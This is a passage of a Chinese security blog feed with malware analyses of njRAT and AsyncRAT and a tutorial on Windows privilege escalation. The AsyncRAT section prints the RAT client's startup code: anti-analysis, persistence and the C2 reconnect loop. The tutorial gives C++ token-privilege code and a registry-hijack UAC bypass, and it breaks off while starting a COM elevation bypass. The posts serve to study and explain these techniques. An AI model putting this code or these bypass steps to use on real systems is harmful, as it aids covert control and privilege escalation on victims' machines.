Sources</strong>(ID：DS****)：数据源表示可以通过传感器&#x2F;日志收集的各种信息主题&#x2F;主题。数据源还包括数据组件，它标识与检测给定ATT&amp;CK技术或子技术相关的数据源的特定属性&#x2F;值。</p><p><strong>Mitigations</strong>(ID：M****)：缓解措施表示可用于防止成功执行技术或子技术的安全概念和技术类别。</p><p><strong>Groups</strong>(ID：M****)：组织是指由安全社区跟踪的活动集群的通用名称。</p><p><strong>Software</strong>(ID：S****)：软件是指自定义或商业代码、操作系统实用程序、开源软件的通用术语，或用于执行在 ATT&amp;CK 中建模的行为的其他工具。</p><p><strong>Campaigns</strong>(ID：C****)：活动是指安全社区使用各种分析方法和术语跟踪入侵活动，例如操作、入侵集和活动。</p><p>对象之间的关系如下图</p><img src="image-20221206110035263.png" alt="image-20221206110035263" style="zoom: 67%;" /><h2 id="ATT-amp-CK-模型的使用"><a href="#ATT-amp-CK-模型的使用" class="headerlink" title="ATT&amp;CK 模型的使用"></a>ATT&amp;CK 模型的使用</h2><ul><li><strong>Detections and Analytics（检测和分析）：</strong>帮助网络防御者开发分析程序，以检测对手使用的技术。</li><li><strong>Threat Intelligence（威胁情报）：</strong>为分析人员提供了一种通用语言来构造，比较和分析威胁情报。</li><li><strong>Adversary Emulation and Red Teaming（攻击模拟）：</strong>提供了一种通用语言和框架，攻击模拟团队可以使用该语言和框架来模拟特定威胁并计划其行动。</li><li><strong>Assessment and Engineering（评估与工程化）：</strong>可用于评估组织的能力并推动工程决策。</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://attack.mitre.org/docs/ATTACK_Design_and_Philosophy_March_2020.pdf">https://attack.mitre.org/docs/ATTACK_Design_and_Philosophy_March_2020.pdf</a></p><p><a href="https://attack.mitre.org/docs/enterprise-attack-v12.1/enterprise-attack-v12.1.xlsx">https://attack.mitre.org/docs/enterprise-attack-v12.1/enterprise-attack-v12.1.xlsx</a></p><p><a href="https://mitre-attack.github.io/attack-navigator/">https://mitre-attack.github.io/attack-navigator/</a></p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ATT&amp;CK</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>njRAT分析</title>
    <link href="/2022/11/18/njRAT%E5%88%86%E6%9E%90/"/>
    <url>/2022/11/18/njRAT%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>njRAT，也称为Bladabindi或者Njw0rm，是一种远程木马，用于远程控制受感染的计算机。是由名为Sparclyheason的地下黑客社区成员制作，使用微软.NET框架开发。于2013年6月首次被发现，并经常用于攻击中东的目标。它可以通过网络钓鱼和外部USB驱动器进行传播。</p><p>RedPacket Security 将 njRAT 描述为：“远程访问木马 (RAT) 具有记录击键、访问受害者的相机、窃取浏览器中存储的凭据、打开反向Shell、上传&#x2F;下载文件、查看受害者的桌面、执行进程、文件、和注册表操作，以及让攻击者更新、卸载、重启、关闭、断开 RAT 并重命名其活动 ID 的能力。通过命令与控制 (CnC) 服务器软件，攻击者有能力创建和配置恶意软件以进行传播通过 USB 驱动器。” </p><p>主要功能包括：</p><ul><li>抓取屏幕</li><li>远程执行shell</li><li>键盘记录</li><li>窃取浏览器中保存的密码</li><li>文件、进程、服务、注册表的操作</li><li>摄像头、麦克风监控</li></ul><h2 id="主程序，即控制端"><a href="#主程序，即控制端" class="headerlink" title="主程序，即控制端"></a>主程序，即控制端</h2><p>此次选择的是njRAT的0.7d版本</p><p>打开软件，首先需要选择程序的监听端口，默认为5552。然后就会进入程序主界面，如下图</p><p><img src="/2022/11/18/njRAT%E5%88%86%E6%9E%90/image-20221118093303371.png" alt="image-20221118093303371"></p><p>主界面主体显示上线的受害主机信息，并可以对相应主机进行操作。下方分别设置了四个模块，分别为Logs、Builder、Settings、About。</p><table><thead><tr><th>Logs</th><th>显示记录的日志</th></tr></thead><tbody><tr><td>Builder</td><td>用于创建远控程序及远控程序相关设置</td></tr><tr><td>Settings</td><td>一些设置，包括远程桌面显示大小、日志的参数、照相机和麦克风的设置等</td></tr><tr><td>About</td><td>描述当前软件的信息</td></tr></tbody></table><p>当受控端上线时，控制端会自动弹出提示信息。</p><h2 id="受控端，即RAT木马"><a href="#受控端，即RAT木马" class="headerlink" title="受控端，即RAT木马"></a>受控端，即RAT木马</h2><p>木马主体代码结构，如下图</p><img src="image-20221118101655811.png" alt="image-20221118101655811" style="zoom:80%;" /><p>木马的相关配置</p><img src="image-20221118155730083.png" alt="image-20221118155730083" style="zoom:80%;" /><p>木马入口Main函数调用了Ok类的ko方法</p><p><img src="/2022/11/18/njRAT%E5%88%86%E6%9E%90/image-20221118102254736.png" alt="image-20221118102254736"></p><p>通过创建互斥体来实现单实例运行</p><p><img src="/2022/11/18/njRAT%E5%88%86%E6%9E%90/image-20221118105507772.png" alt="image-20221118105507772"></p><p>根据配置拷贝自身到相应目录并运行，关闭Windows文件安全认证机制</p><p><img src="/2022/11/18/njRAT%E5%88%86%E6%9E%90/image-20221118113456010.png" alt="image-20221118113456010"></p><p>添加防火墙白名单，设置自启动</p><p><img src="/2022/11/18/njRAT%E5%88%86%E6%9E%90/image-20221118131351234.png" alt="image-20221118131351234"></p><p>开启通信线程和键盘记录线程</p><p><img src="/2022/11/18/njRAT%E5%88%86%E6%9E%90/image-20221118132142611.png" alt="image-20221118132142611"></p><p>键盘记录功能函数</p><p><img src="/2022/11/18/njRAT%E5%88%86%E6%9E%90/image-20221118133637429.png" alt="image-20221118133637429"></p><p>OK类的RC方法负责与C2连接，并执行C2发来的指令</p><p><img src="/2022/11/18/njRAT%E5%88%86%E6%9E%90/image-20221118142154117.png" alt="image-20221118142154117"></p><p>针对不同指令进行处理</p><p><img src="/2022/11/18/njRAT%E5%88%86%E6%9E%90/image-20221118154644578.png" alt="image-20221118154644578"></p><p>指令具体如下</p><p><img src="/2022/11/18/njRAT%E5%88%86%E6%9E%90/image-20221118154722008.png" alt="image-20221118154722008"></p><h2 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h2><p>Base64 加 |’|’| </p><p><img src="/2022/11/18/njRAT%E5%88%86%E6%9E%90/image-20221118160218407.png" alt="image-20221118160218407"></p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>njRAT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AsyncRAT分析</title>
    <link href="/2022/11/11/AsyncRAT%E5%88%86%E6%9E%90/"/>
    <url>/2022/11/11/AsyncRAT%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp">AsyncRAT</a>是一个APT组织喜欢使用的开源RAT之一，该木马最初由Github用户NYAN-x-CAT使用C#开发，此后该工具被多个黑客组织或者个人修改、增强用于各种网络间谍活动中。</p><p>AsyncRAT不仅包括通讯、守护、隐藏、自启动等常见功能模块，还包含加密、反沙盒、反虚拟机、反分析、反调试等对抗模块。并且将远程桌面监控、Webcam监控、键盘记录、文件查找、远程shell、Bots Killer以及DDos攻击等功能做成DLL放在了服务端，然后通过传输功能插件，在内存里加载运行，这样大大提高了木马的灵活性和扩展性，加大了安全人员分析的难度。是一款相对比较成熟、容易扩展的异步通讯开源木马。</p><p>AsyncRAT采用反向连接的方式，也就是Client（受控端）主动发送数据联系Server（控制端）。作为分析人员拿到的也是受控端，因此本次主要分析受控端。</p><h2 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h2><p>分析C#程序可以使用<a href="https://github.com/dnSpy/dnSpy">dnspy</a>进行反编译、调试，以下使用VS直接对源码进行分析</p><p><img src="/2022/11/11/AsyncRAT%E5%88%86%E6%9E%90/image-20221109153949837.png" alt="image-20221109153949837"></p><p>其中比较主要的是Program.cs（入口文件）以及Settings.cs（配置文件）</p><h3 id="入口主函数"><a href="#入口主函数" class="headerlink" title="入口主函数"></a>入口主函数</h3><p>入口函数位于Program.cs，主要代码如下：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>()</span><br>        &#123;<br>            <span class="hljs-comment">//设置延迟</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; Convert.ToInt32(Settings.Delay); i++)               <br>            &#123;<br>                Thread.Sleep(<span class="hljs-number">1000</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (!Settings.InitializeSettings()) Environment.Exit(<span class="hljs-number">0</span>);       <span class="hljs-comment">//初始化配置</span><br>            <span class="hljs-keyword">try</span><br>            &#123;<br>                <span class="hljs-keyword">if</span> (!MutexControl.CreateMutex()) <span class="hljs-comment">//如果当前有效载荷是重复的退出，检查互斥量</span><br>                    Environment.Exit(<span class="hljs-number">0</span>);<br>                <span class="hljs-keyword">if</span> (Convert.ToBoolean(Settings.Anti)) <span class="hljs-comment">//检查配置，是否运行反虚拟环境</span><br>                    Anti_Analysis.RunAntiAnalysis();<br>                <span class="hljs-keyword">if</span> (Convert.ToBoolean(Settings.Install)) <span class="hljs-comment">//检查配置，是否释放有效载荷[持久化]</span><br>                    NormalStartup.Install();<br>                <span class="hljs-keyword">if</span> (Convert.ToBoolean(Settings.BDOS) &amp;&amp; Methods.IsAdmin()) <span class="hljs-comment">//检查配置，在管理员身份下是否保护进程</span><br>                    ProcessCritical.Set();<br>                Methods.PreventSleep(); <span class="hljs-comment">//防止应用程序运行时电脑睡眠，保持线程处于在线状态</span><br>            &#125;<br>            <span class="hljs-keyword">catch</span> &#123; &#125;<br>            <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) <span class="hljs-comment">// 上线机制</span><br>            &#123;<br>                <span class="hljs-keyword">try</span><br>                &#123;<br>                    <span class="hljs-keyword">if</span> (!ClientSocket.IsConnected)<br>                    &#123;<br>                        ClientSocket.Reconnect();            <span class="hljs-comment">//释放连接资源，应该是用于重连</span><br>                        ClientSocket.InitializeClient();    <span class="hljs-comment">//初始化，连接C2地址</span><br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">catch</span> &#123; &#125;<br>                Thread.Sleep(<span class="hljs-number">5000</span>);<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>配置文件为Settings.cs，包含控制端地址、端口、版本号等配置信息</p><p>在Debug和Release模式下编译不同的代码。Debug模式配置变量为明文字符串，Release模式配置变量需要经过解密。</p><p><img src="/2022/11/11/AsyncRAT%E5%88%86%E6%9E%90/image-20221109163523734.png" alt="image-20221109163523734"></p><p>解密函数。读取 base64 编码的字符串，前 32 个字节代表 HMAC，后面 16 个字节是解密向量 IV，其余字节是加密数据。</p><p>解密 AsyncRAT 的 Python 脚本 <a href="https://github.com/netskopeoss/NetskopeThreatLabsIOCs/tree/main/AsyncRAT">https://github.com/netskopeoss/NetskopeThreatLabsIOCs/tree/main/AsyncRAT</a></p><p><img src="/2022/11/11/AsyncRAT%E5%88%86%E6%9E%90/image-20221109164217175.png" alt="image-20221109164217175"></p><img src="image-20221111093656945.png" alt="image-20221111093656945" style="zoom:80%;" /><h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><p><strong>创建互斥量</strong></p><p><img src="/2022/11/11/AsyncRAT%E5%88%86%E6%9E%90/image-20221111095324649.png" alt="image-20221111095324649"></p><p><strong>进行反虚拟化、反调试对抗</strong></p><p><img src="/2022/11/11/AsyncRAT%E5%88%86%E6%9E%90/image-20221111095813238.png" alt="image-20221111095813238"></p><p><strong>安装，实现持久化</strong></p><p><img src="/2022/11/11/AsyncRAT%E5%88%86%E6%9E%90/image-20221111102113423.png" alt="image-20221111102113423"></p><p>复制自身到安装路径，释放bat文件</p><p><img src="/2022/11/11/AsyncRAT%E5%88%86%E6%9E%90/image-20221111102308978.png" alt="image-20221111102308978"></p><p><strong>实现保护进程</strong></p><p><img src="/2022/11/11/AsyncRAT%E5%88%86%E6%9E%90/image-20221111102606149.png" alt="image-20221111102606149"></p><p><strong>设置线程始终处于执行状态方式</strong></p><p><img src="/2022/11/11/AsyncRAT%E5%88%86%E6%9E%90/image-20221111102726715.png" alt="image-20221111102726715"></p><h3 id="远控过程"><a href="#远控过程" class="headerlink" title="远控过程"></a>远控过程</h3><p>首先，创建socket连接，根据配置文件与C2地址建立连接</p><p><img src="/2022/11/11/AsyncRAT%E5%88%86%E6%9E%90/image-20221111110906770.png" alt="image-20221111110906770"></p><p>然后，进行ssl身份验证，并收集受感染主机和木马自身版本等相关信息储存在MsgPack类中，发送给C2服务器</p><p><img src="/2022/11/11/AsyncRAT%E5%88%86%E6%9E%90/image-20221111113441214.png" alt="image-20221111113441214"></p><p><img src="/2022/11/11/AsyncRAT%E5%88%86%E6%9E%90/image-20221111112756152.png" alt="image-20221111112756152"></p><p>最后是最重要的，接受并处理控制端的消息</p><p><img src="/2022/11/11/AsyncRAT%E5%88%86%E6%9E%90/image-20221111135434703.png" alt="image-20221111135434703"></p><p>懒癌入骨，适可而止 &#x3D; &#x3D;</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.4hou.com/posts/vDMr">https://www.4hou.com/posts/vDMr</a></p><p><a href="https://www.freebuf.com/articles/network/344283.html">https://www.freebuf.com/articles/network/344283.html</a></p><p><a href="https://www.anquanke.com/post/id/184263">https://www.anquanke.com/post/id/184263</a></p><p><a href="https://mp.weixin.qq.com/s/T15pdznZZ4ZsVVpcKrWlnQ">https://mp.weixin.qq.com/s/T15pdznZZ4ZsVVpcKrWlnQ</a></p><p>（侵删）</p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AsyncRAT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>提权技术</title>
    <link href="/2022/11/08/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF/"/>
    <url>/2022/11/08/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="第六章-提权技术"><a href="#第六章-提权技术" class="headerlink" title="第六章  提权技术"></a>第六章  提权技术</h2><h3 id="进程访问令牌权限提升"><a href="#进程访问令牌权限提升" class="headerlink" title="进程访问令牌权限提升"></a>进程访问令牌权限提升</h3><h4 id="访问令牌"><a href="#访问令牌" class="headerlink" title="访问令牌"></a>访问令牌</h4><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/secauthz/access-tokens?redirectedfrom=MSDN"><strong>访问令牌</strong></a> 是描述进程或线程的安全上下文的对象。令牌中的信息包括与进程或线程关联的用户帐户的标识和特权。当用户登录时，系统会通过将密码与存储在安全数据库中的信息进行比较来验证用户的密码。如果密码经过身份验证，系统会生成访问令牌，并且代表该用户执行的每个进程都拥有该令牌的一个副本。该令牌标识用户、用户所属组和用户的特权。 系统使用该令牌控制对可保护对象的访问，并控制用户在本地计算机上执行各种系统相关操作的能力。有两种类型的访问令牌，主要令牌和模拟。</p><p>当线程与安全对象交互或尝试执行需要特权的系统任务时，系统使用访问令牌标识用户。 访问令牌包含以下信息：</p><ul><li>用户帐户 <a href="https://learn.microsoft.com/zh-cn/windows/win32/secauthz/security-identifiers">的安全标识符</a> (SID) </li><li>用户所属组的 SID</li><li>标识当前<a href="https://learn.microsoft.com/zh-cn/windows/desktop/SecGloss/l-gly"><em>登录会话</em></a>的<a href="https://learn.microsoft.com/zh-cn/windows/desktop/SecGloss/l-gly"><em>登录 SID</em></a></li><li>用户或用户组持有 <a href="https://learn.microsoft.com/zh-cn/windows/win32/secauthz/privileges">的特权</a> 列表</li><li>所有者 SID</li><li>主组的 SID</li><li>当用户创建安全对象时系统使用的默认 <a href="https://learn.microsoft.com/zh-cn/windows/win32/secauthz/access-control-lists">DACL</a> ，而无需指定 <a href="https://learn.microsoft.com/zh-cn/windows/desktop/SecGloss/s-gly"><em>安全描述符</em></a></li><li>访问令牌的源</li><li>令牌是 <a href="https://learn.microsoft.com/zh-cn/windows/desktop/SecGloss/p-gly"><em>主要</em></a> 令牌还是 <a href="https://learn.microsoft.com/zh-cn/windows/win32/secauthz/client-impersonation">模拟</a> 令牌</li><li>限制 <a href="https://learn.microsoft.com/zh-cn/windows/win32/secauthz/restricted-tokens">SID 的</a>可选列表</li><li>当前模拟级别</li><li>其他统计信息</li></ul><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>要想提升访问令牌权限，首先就要获取进程的访问令牌，然后将访问令牌的权限修改为指定权限。但是系统内部并不直接识别权限名称<br>而是识别LUID值，所以需要根据权限名称获取对应的LUID值，之后传递给系统，实现进程访问令牌权限的修改。</p><p>具体实现步骤如下所示：</p><p><strong>首先</strong>,程序需要调用<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken">OpenProcessToken</a>函数打开指定的进程令牌，并获取TOKEN_ADJUST_PRIVILEGES权限的令牌句柄。之所以要指定进程令牌权限为TOKEN_ADJUST_PRIVILEGES，是因为<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges">AdjustTokenPrivileges</a>函数要求有此权限，方可修改进程令牌的访问权限。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//打开进程令牌并获取具有TOKEN_ADJUST_PRIVILEGES权限的进程令牌句柄</span><br><span class="hljs-built_in">OpenProcessToken</span>(hProcess,TOKEN_ADJUST_PRIVILEGES,&amp;hToken)l;<br><span class="hljs-comment">//其中，第一个参数表示要打开的进程令牌的进程句柄;第二个参数表示程序对进程令牌具有的权限，TOKEN_ADJUST_PRIVILEGES表示具有修改进程令牌的权限;第三个参数表示返回的进程令牌句柄。</span><br></code></pre></td></tr></table></figure><p><strong>再接着</strong>调用<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluea">LookupPrivilegeValue</a>函数，获取本地系统指定特权名称的LUID值，这个LUID值相当于该特权的身份标识号。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//获取本地系统的pszPrivilegesName特权的LUID值</span><br><span class="hljs-built_in">LookupPrivilegeValue</span>(<span class="hljs-literal">NULL</span>,pszPrivilegesName,&amp;luidValue);<br><span class="hljs-comment">//其中，第一个参数表示系统，NULL表示本地系统;第二个参数表示特权名称;第三个参数表示获取到的LUID返回值。</span><br></code></pre></td></tr></table></figure><p><strong>接着</strong>，程序就开始对进程令牌特权结构体TOKEN_PRIVILEGES进行赋值，设置新特权的数量、特权对应的LUID值以及特权的属性状态。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//设置提升权限信息</span><br>tokenPrivileges.PrivilegeCount = <span class="hljs-number">1</span>;<br>tokenPrivileges.Privileges[<span class="hljs-number">0</span>].Luid = luidValue;<br>tokenPrivileges.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br><span class="hljs-comment">//其中，PrivilegeCount表示设置新特权的数量;Privileges[0].Luid表示第一个特权对应的LUID值;Privileges[0].Attributes表示第一个特权的属性，SE_PRIVILEGE_ENABLED表示启动该特权。</span><br></code></pre></td></tr></table></figure><p><strong>最后</strong>，程序调用AdjustTokenPrivileges函数对进程令牌的特权进行修改，将上面设置好的新特权设置到进程令牌中，这样就完成了进程访问令牌的修改工作。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//修改进程令牌访问权限</span><br><span class="hljs-built_in">AdjustTokenPrivileges</span>(hToken,FALSE,&amp;tokenPrivileges,<span class="hljs-number">0</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">//其中，第一个参数表示进程令牌;第二个参数表示是否禁用所有令牌的权限，FALSE表示不禁用;第三个参数是新设置的特权,指向设置好的令牌特权结构体;第四个参数表示返回上一个特权数据缓冲区的大小，若不获取，则可以设为零;第五个参数表示返回上一个特权数据缓冲区，若不接收返回数据,可以设为NULL;第六个参数表示返回上一个特权数据缓冲区应该有的大小。</span><br></code></pre></td></tr></table></figure><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">EnbalePrivileges</span><span class="hljs-params">(HANDLE hProcess, <span class="hljs-type">char</span>* pszPrivilegesName)</span></span><br><span class="hljs-function"></span>&#123;<br>HANDLE hToken = <span class="hljs-literal">NULL</span>;<br>LUID luidValue = &#123; <span class="hljs-number">0</span> &#125;;<br>TOKEN_PRIVILEGES tokenPrivileges = &#123; <span class="hljs-number">0</span> &#125;;<br>BOOL bRet = FALSE;<br>DWORD dwRet = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// 打开进程令牌并获取具有 TOKEN_ADJUST_PRIVILEGES 权限的进程令牌句柄</span><br>bRet = <span class="hljs-built_in">OpenProcessToken</span>(hProcess, TOKEN_ADJUST_PRIVILEGES, &amp;hToken);<br><span class="hljs-keyword">if</span> (FALSE == bRet)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;OpenProcessToken&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 获取本地系统的 pszPrivilegesName 特权的LUID值</span><br>bRet = <span class="hljs-built_in">LookupPrivilegeValue</span>(<span class="hljs-literal">NULL</span>, pszPrivilegesName, &amp;luidValue);<br><span class="hljs-keyword">if</span> (FALSE == bRet)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;LookupPrivilegeValue&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 设置提升权限信息</span><br>tokenPrivileges.PrivilegeCount = <span class="hljs-number">1</span>;<br>tokenPrivileges.Privileges[<span class="hljs-number">0</span>].Luid = luidValue;<br>tokenPrivileges.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br><span class="hljs-comment">// 提升进程令牌访问权限</span><br>bRet = <span class="hljs-built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tokenPrivileges, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (FALSE == bRet)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;AdjustTokenPrivileges&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-comment">// 根据错误码判断是否特权都设置成功</span><br>dwRet = ::<span class="hljs-built_in">GetLastError</span>();<br><span class="hljs-keyword">if</span> (ERROR_SUCCESS == dwRet)<br>&#123;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ERROR_NOT_ALL_ASSIGNED == dwRet)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;ERROR_NOT_ALL_ASSIGNED&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h3><p>自从VISTA系统开始引人了UAC（用户账户控制），涉及权限操作时都会有弹窗提示，只有用户点击确认后，方可继续操作。所以，VISTA之后的提权操作主要是针对UAC不弹窗静默提权，即BypassUAC。</p><p>触发UAC时，系统会创建一个consent.exe进程，该进程通过白名单和用户选择来判断是否创建管理员权限进程。请求进程将要请求的进程cmdline和进程路径通过LPC接口传递给appinfo和RAiLuanchAdminProcess函数。该函数首先验证路径是否在白名单中，并将结果传递给consent.exe进程，该进程验证请求进程的签名以及发起者的权限是否符合要求后，决定是否弹出UAC窗口让用户确认。这个UAC窗口会创建新的安全桌面，屏蔽之前的界面。同时这个UAC窗口进程时系统权限进程，其他普通进程无法和其进行通信交互。用户确认之后，会调用CreateProcessAsUser函数以管理员身份启动请求的进程。</p><p>Bypass UAC提权技术主要利用<strong>白名单机制</strong>以及<strong>COM组件接口技术</strong>来实现。</p><h4 id="基于白名单程序的Bypass-UAC"><a href="#基于白名单程序的Bypass-UAC" class="headerlink" title="基于白名单程序的Bypass UAC"></a>基于白名单程序的Bypass UAC</h4><p>有些系统程序是直接获取管理员权限，而不触发UAC弹框的，这类程序称为白名单程序。可以通过DLL劫持、注入或是修改注册表执行命令等方式，利用这些白名单程序启动目标程序，实现BypassUAC提权操作。</p><p><strong>选取CompMgmtLauncher.exe进行详细分析。</strong></p><p>分析发现，CompMgmtLauncher.exe进程会先查询注册表HKCU\Software\Classes\mscfile\shell\open\command中的数据，发现该路路径不存在后，继续查询注册表HKCR\mscfile\shell\open\command(Default)中的数据并读取，该注册表路径中存储着mmc.exe进程的路径信息。然后执行mmc.exe。</p><p><img src="/2022/11/08/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF/image-20221107150614658.png" alt="image-20221107150614658"></p><p>所以我们可以在HKCU\Software\Classes\mscfile\shell\open\command中写入数据。手动添加该注册表路径，并设置默认数据为C:\Windows\System32\cmd.exe，并运行CompMgmtLauncher.exe。</p><p><img src="/2022/11/08/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF/image-20221107150827532.png" alt="image-20221107150827532"></p><p><strong>结果cmd并未以管理员权限运行。</strong>推测是windows更新，对相关功能进行修改。</p><h4 id="基于COM组件接口的Bypass-UAC"><a href="#基于COM组件接口的Bypass-UAC" class="headerlink" title="基于COM组件接口的Bypass UAC"></a>基于COM组件接口的Bypass UAC</h4><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/com/the-com-elevation-moniker">COM提升名字对象</a>（COM Elevation  Moniker）技术允许运行在用户账户控制下的应用程序用提升权限的方法来激活COM类，以提升COM接口权限。</p><p>同时，ICMLuaUtil接口提供了ShellExec方法来执行命令，创建指定进程。因此，我们可以利用COM提升名字对象来对ICMLuaUtil接口提权，之后通过接口调用ShellExec方法来创建指定进程，实现Bypass UAC。</p><p><strong>实现过程</strong></p><p>使用权限提升COM类的程序必须通过调用CoCreatelnstanceAsAdmin函数来创建COM类，下面给出的是函数的改进代码，它增加了初始化COM环境的代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 